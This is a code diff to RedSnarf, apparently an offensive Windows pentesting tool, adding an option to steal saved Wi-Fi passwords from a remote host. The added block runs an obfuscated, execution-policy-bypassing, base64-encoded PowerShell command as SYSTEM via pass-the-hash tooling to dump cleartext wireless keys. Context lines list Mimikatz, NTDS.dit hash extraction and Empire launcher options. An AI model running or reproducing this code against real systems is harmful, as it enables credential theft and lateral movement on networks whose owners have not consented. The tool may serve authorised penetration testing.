@@ -1489,7 +1489,7 @@ def main():
 					print colored ("[+]Found " + find_user + " logged in to "+str(ip),'green')
 
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="%prog 0.3b", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="%prog 0.3c", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
 p.add_argument("-u", "--username", dest="username", default="Administrator",help="Enter a username")
@@ -1511,6 +1511,7 @@ p.add_argument("-uP", "--policiesscripts_dump", dest="policiesscripts_dump", def
 p.add_argument("-uR", "--multi_rdp", dest="multi_rdp", default="n", help="<Optional> Enable Multi-RDP with Mimikatz")
 p.add_argument("-uU", "--unattend", dest="unattend", default="n", help="<Optional> Enter y to look for and grap unattended installation files")
 p.add_argument("-uX", "--xcommand", dest="xcommand", default="n", help="<Optional> Run custom command")
+p.add_argument("-uW", "--wifi_credentials", dest="wifi_credentials", default="n", help="<Optional> Grab Wifi Credentials")
 # Hash related
 p.add_argument("-hN", "--ntds_util", dest="ntds_util", default="", help="<Optional> Extract NTDS.dit using NTDSUtil")
 p.add_argument("-hI", "--drsuapi", dest="drsuapi", default="", help="<Optional> Extract NTDS.dit hashes using drsuapi method - accepts machine name as username")
@@ -1594,6 +1595,7 @@ user_desc=args.user_desc
 recorddesktop=args.recorddesktop
 empire_launcher=args.empire_launcher
 mssqlshell=args.mssqlshell
+wifi_credentials=args.wifi_credentials
 
 if lat in yesanswers:
 	WriteLAT()
@@ -1637,6 +1639,40 @@ elif remotetargets[0:6]=='range=':
 		
 	for remotetarget in IPNetwork(remotetargets[6:len(remotetargets)]):
 		targets.append (remotetarget);
+
+if wifi_credentials in yesanswers:
+	if len(targets)==1:
+		try:
+			#Get Wifi Passwords And Network Names
+			print colored("[+]Retrieve Wifi Password",'yellow')
+						
+			line="netsh wlan show profiles"
+
+			en = b64encode(line.encode('UTF-16LE'))						
+						
+			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+			stdout_value = proc.communicate()[0]
+			print stdout_value
+
+			if "There is no wireless interface on the system." in stdout_value:
+				sys.exit()
+
+			response = raw_input("\nEnter the name of Wifi Profile : ")
+			line="netsh wlan show profile name=\""+response+"\" key=clear"
+
+			en = b64encode(line.encode('UTF-16LE'))						
+						
+			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+			stdout_value = proc.communicate()[0]
+			print stdout_value
+
+			sys.exit()
+			
+		except OSError:
+			print colored("[-]Something went wrong getting Wifi Details",'red')
+	else:
+		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
+		sys.exit()
 
 
 if mssqlshell=="WIN" or mssqlshell=="DB":
